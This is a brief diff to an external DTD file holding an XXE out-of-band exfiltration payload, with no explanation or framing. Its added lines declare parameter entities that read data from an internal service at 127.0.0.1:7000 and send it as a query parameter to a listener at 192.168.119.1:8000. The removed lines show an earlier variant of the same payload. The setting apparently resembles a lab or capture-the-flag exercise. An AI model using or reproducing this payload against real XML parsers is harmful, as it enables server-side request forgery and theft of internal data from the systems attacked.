@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "http://127.0.0.1:7000/hostname.php">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:7000/?x=%file;'>">
+<!ENTITY % file SYSTEM "http://127.0.0.1:7000">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.119.1:8000/?x=%file;'>">
 %eval;
 %exfil;
